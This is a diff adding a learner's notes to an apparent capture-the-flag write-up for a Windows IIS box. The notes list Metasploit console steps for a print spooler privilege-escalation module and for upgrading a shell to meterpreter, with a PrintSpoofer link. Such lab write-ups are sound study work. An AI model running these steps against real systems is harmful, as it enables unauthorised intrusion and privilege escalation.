@@ -79,6 +79,31 @@ c:\inetpub\wwwroot\nt4wrksv
 ```
 https://github.com/itm4n/PrintSpoofer
 
+i can use metasploit for it. bg session 
+
+```
+search printspooler
+
+use 4
+
+sessions
+
+set session 1
+
+run
+
+```
+need to upgrade meterpreter shell 
+```
+use post/multi/manage/shell_to_meterpreter
+
+set session 1
+
+run
+```
+now need to run the printspooler again
+```
+
 
 
 I couldnt get the smb share to copy the file over to my machine and still not sure of the error
